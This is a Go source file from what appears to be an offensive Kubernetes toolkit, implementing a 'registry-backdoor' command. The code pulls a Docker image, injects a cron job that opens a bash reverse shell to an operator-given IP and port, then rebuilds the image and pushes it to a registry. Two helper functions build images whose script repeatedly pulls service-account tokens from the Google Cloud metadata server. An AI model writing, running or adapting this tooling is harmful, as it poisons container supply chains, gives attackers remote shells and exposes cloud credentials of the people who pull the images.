package out_cluster

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"kubeshadow/pkg/errors"
	"kubeshadow/pkg/logger"

	"github.com/spf13/cobra"
)

var (
	// RegistryBackdoorCmd represents the command for the registry backdoor module
	RegistryBackdoorCmd = &cobra.Command{
		Use:   "registry-backdoor",
		Short: "Inject a backdoor into a Docker image and push it",
		Long:  `Pulls a Docker image, injects a simple reverse shell cronjob, builds a new image, and pushes it to a specified registry. REQUIRES Docker to be installed and running.`, // Added Long description
		RunE: func(cmd *cobra.Command, args []string) error {
			// Get flag values
			imageName, _ := cmd.Flags().GetString("image")
			newTag, _ := cmd.Flags().GetString("new-tag")
			ip, _ := cmd.Flags().GetString("ip")
			port, _ := cmd.Flags().GetString("port")

			// Basic validation (more comprehensive validation might be needed)
			if imageName == "" || newTag == "" || ip == "" || port == "" {
				return errors.New(errors.ErrValidation, "required flags --image, --new-tag, --ip, and --port are missing", nil)
			}

			// Execute the core logic
			return runRegistryBackdoorLogic(cmd.Context(), imageName, newTag, ip, port)
		},
	}
)

func init() {
	// Define flags for the command
	RegistryBackdoorCmd.Flags().String("image", "", "Source Docker image name (e.g., ubuntu:latest)")
	RegistryBackdoorCmd.Flags().String("new-tag", "", "New tag for the backdoored image (e.g., myregistry/ubuntu:backdoored)")
	RegistryBackdoorCmd.Flags().String("ip", "", "IP address for the reverse shell")
	RegistryBackdoorCmd.Flags().String("port", "", "Port for the reverse shell")

	// Mark flags as required
	RegistryBackdoorCmd.MarkFlagRequired("image")
	RegistryBackdoorCmd.MarkFlagRequired("new-tag")
	RegistryBackdoorCmd.MarkFlagRequired("ip")
	RegistryBackdoorCmd.MarkFlagRequired("port")
}

// runRegistryBackdoorLogic contains the core execution logic for the registry backdoor
func runRegistryBackdoorLogic(ctx context.Context, imageName, newTag, reverseShellIP, reverseShellPort string) error {
	logger.Info("Starting registry backdoor injection for image: %s", imageName)

	// Pull the image
	logger.Info("Pulling original image: %s", imageName)
	pullCmd := exec.CommandContext(ctx, "docker", "pull", imageName)
	if output, err := pullCmd.CombinedOutput(); err != nil {
		return errors.New(errors.ErrRuntime, fmt.Sprintf("failed to pull image %s", imageName), fmt.Errorf("%v\nOutput: %s", err, output))
	}

	// Create Dockerfile that injects a reverse shell or persistence mechanism
	// NOTE: This cronjob reverse shell is a basic example and requires bash in the image.
	// More sophisticated backdoors might be needed depending on the target image.
	dockerfile := fmt.Sprintf(`
FROM %s
RUN echo "*/1 * * * * root bash -i >& /dev/tcp/%s/%s 0>&1" >> /etc/crontab
`, imageName, reverseShellIP, reverseShellPort)

	logger.Info("Writing temporary Dockerfile...")
	if err := writeTempDockerfile(dockerfile); err != nil {
		return errors.New(errors.ErrRuntime, "failed to write temporary Dockerfile", err)
	}

	// Build new image
	logger.Info("Building backdoored image as: %s", newTag)
	buildCmd := exec.CommandContext(ctx, "docker", "build", "-t", newTag, ".")
	buildCmd.Dir = "/tmp/kubeshadow_build"
	if output, err := buildCmd.CombinedOutput(); err != nil {
		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker build failed for %s", newTag), fmt.Errorf("%v\nOutput: %s", err, output))
	}

	// Push new image
	logger.Info("Pushing image: %s", newTag)
	pushCmd := exec.CommandContext(ctx, "docker", "push", newTag)
	if output, err := pushCmd.CombinedOutput(); err != nil {
		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker push failed for %s", newTag), fmt.Errorf("%v\nOutput: %s", err, output))
	}

	logger.Info("Successfully injected backdoor into %s and pushed as %s", imageName, newTag)

	// Cleanup
	if err := cleanupBuild(); err != nil {
		logger.Warn("Failed to cleanup build directory: %v", err)
	}

	return nil
}

func cleanupBuild() error {
	if err := os.RemoveAll("/tmp/kubeshadow_build"); err != nil {
		return fmt.Errorf("failed to remove build directory: %v", err)
	}
	return nil
}

func writeTempDockerfile(content string) error {
	// Ensure the build directory exists
	if err := os.MkdirAll("/tmp/kubeshadow_build", 0755); err != nil {
		return fmt.Errorf("failed to create build directory: %v", err)
	}

	// Sanitize content for Dockerfile
	sanitizedContent := strings.ReplaceAll(content, "\"", "\\\"")
	sanitizedContent = strings.ReplaceAll(sanitizedContent, "`", "\\`")
	sanitizedContent = strings.ReplaceAll(sanitizedContent, "$", "\\$")

	// Write Dockerfile
	dockerfilePath := "/tmp/kubeshadow_build/Dockerfile"
	if err := os.WriteFile(dockerfilePath, []byte(sanitizedContent), 0644); err != nil {
		return fmt.Errorf("failed to write Dockerfile: %v", err)
	}

	return nil
}

// Note: The Module interface methods (Validate, Execute, Cleanup, etc.) defined in the previous step are no longer
// necessary if the command is registered directly via the global variable approach.
// We should remove the unused struct and interface implementation to keep the code clean.

// TODO: Remove unused RegistryBackdoorModule struct and its methods if they are no longer needed.
// Need to verify if any other part of the codebase relies on this module implementing types.Module.
// Based on current main.go and registry code, it seems unlikely, but worth a double check.

func createBackdoorImage(registryURL, imageName, tag string) error {
	// Create a temporary directory for the Dockerfile
	tempDir, err := os.MkdirTemp("", "backdoor-*")
	if err != nil {
		return fmt.Errorf("failed to create temp directory: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Create Dockerfile
	dockerfilePath := filepath.Join(tempDir, "Dockerfile")
	dockerfileContent := `FROM alpine:latest
RUN apk add --no-cache curl
COPY backdoor.sh /backdoor.sh
RUN chmod +x /backdoor.sh
ENTRYPOINT ["/backdoor.sh"]`

	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
		return fmt.Errorf("failed to write Dockerfile: %v", err)
	}

	// Create backdoor script
	scriptPath := filepath.Join(tempDir, "backdoor.sh")
	scriptContent := `#!/bin/sh
while true; do
    curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google" || true
    sleep 300
done`

	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
		return fmt.Errorf("failed to write backdoor script: %v", err)
	}

	// Build and push the image
	cmd := exec.Command("docker", "build", "-t", fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag), tempDir)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to build image: %v\nOutput: %s", err, output)
	}

	cmd = exec.Command("docker", "push", fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag))
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to push image: %v\nOutput: %s", err, output)
	}

	return nil
}

func injectBackdoor(registryURL, imageName, tag string) error {
	// Create a temporary directory for the Dockerfile
	tempDir, err := os.MkdirTemp("", "backdoor-*")
	if err != nil {
		return fmt.Errorf("failed to create temp directory: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Create Dockerfile
	dockerfilePath := filepath.Join(tempDir, "Dockerfile")
	dockerfileContent := fmt.Sprintf(`FROM %s/%s:%s
COPY backdoor.sh /backdoor.sh
RUN chmod +x /backdoor.sh
ENTRYPOINT ["/backdoor.sh"]`, registryURL, imageName, tag)

	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
		return fmt.Errorf("failed to write Dockerfile: %v", err)
	}

	// Create backdoor script
	scriptPath := filepath.Join(tempDir, "backdoor.sh")
	scriptContent := `#!/bin/sh
while true; do
    curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google" || true
    sleep 300
done`

	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
		return fmt.Errorf("failed to write backdoor script: %v", err)
	}

	// Build and push the image
	cmd := exec.Command("docker", "build", "-t", fmt.Sprintf("%s/%s:%s-backdoor", registryURL, imageName, tag), tempDir)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to build image: %v\nOutput: %s", err, output)
	}

	cmd = exec.Command("docker", "push", fmt.Sprintf("%s/%s:%s-backdoor", registryURL, imageName, tag))
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to push image: %v\nOutput: %s", err, output)
	}

	return nil
}
